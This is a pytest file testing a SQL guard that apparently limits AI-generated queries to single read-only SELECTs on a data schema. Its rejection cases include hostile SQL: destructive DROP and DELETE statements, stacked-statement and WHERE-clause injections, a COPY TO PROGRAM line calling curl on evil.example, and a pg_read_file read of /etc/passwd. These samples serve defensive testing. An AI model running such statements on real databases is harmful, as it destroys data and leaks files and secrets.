import pytest

from fsm_ai.data_access.sql_guard import SqlGuard

guard = SqlGuard()


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT COUNT(*) FROM data.transactions",
        "select t.transaction_type, avg(fl.is_fraud::int) from data.transactions t "
        "join data.fraud_labels fl on fl.transaction_id = t.id::text group by 1;",
        "WITH monthly AS (SELECT date_trunc('month', date) AS m FROM data.transactions) "
        "SELECT m, COUNT(*) FROM monthly GROUP BY m",
        "SELECT id FROM data.cards UNION SELECT id FROM data.users",
        "SELECT * FROM data.merchants WHERE name LIKE '%5%' -- trailing comment",
        "SELECT g FROM generate_series(1, 3) AS g",
    ],
)
def test_allows_read_only_selects_on_data(sql: str) -> None:
    assert guard.check(sql).ok


@pytest.mark.parametrize(
    ("sql", "reason"),
    [
        ("DROP TABLE data.transactions", "SELECT"),
        ("UPDATE data.cards SET card_on_dark_web = true", "SELECT"),
        ("DELETE FROM data.fraud_labels", "SELECT"),
        ("INSERT INTO data.users (id) VALUES (1)", "SELECT"),
        ("TRUNCATE data.transactions", "SELECT"),
        ("SELECT 1; DROP TABLE data.transactions", "one SQL statement"),
        ("SELECT 1 /* hide */ ; DELETE FROM data.cards", "one SQL statement"),
        ("SELECT 1; -- \nDELETE FROM data.cards", "one SQL statement"),
        ("WITH gone AS (DELETE FROM data.cards RETURNING *) SELECT * FROM gone", "Delete"),
        ("COPY data.users TO PROGRAM 'curl evil.example'", "SELECT"),
        ("SELECT pg_read_file('/etc/passwd')", "pg_read_file"),
        ("SELECT pg_sleep(60)", "pg_sleep"),
        ("SELECT set_config('statement_timeout', '0', false)", "set_config"),
        ("SET ROLE postgres", "SELECT"),
        ("SELECT * INTO data.copy FROM data.users", "Into"),
        ("SELECT * FROM data.cards FOR UPDATE", "Lock"),
        ("SELECT * FROM fsm_chat.chat_messages", "fsm_chat.chat_messages"),
        ("SELECT * FROM pg_catalog.pg_roles", "pg_catalog"),
        ("SELECT * FROM transactions", "schema-qualify"),
        ("SELEC * FROM data.users", ""),
    ],
)
def test_rejects_unsafe_or_out_of_scope_sql(sql: str, reason: str) -> None:
    result = guard.check(sql)

    assert not result.ok
    assert reason in result.reason


@pytest.mark.parametrize(
    "clause",
    [
        "1=1; DROP TABLE data.transactions",
        "true) UNION SELECT 1, 1, 1 FROM data.users WHERE (true",
        "true) --",
        "",
    ],
)
def test_rejects_where_clauses_that_escape_the_rule(clause: str) -> None:
    assert not guard.check_where_clause(clause).ok


def test_allows_rule_clause_with_subquery() -> None:
    clause = (
        "t.merchant_location_id IN (SELECT id FROM data.merchant_locations WHERE state = 'Italy')"
    )

    assert guard.check_where_clause(clause).ok
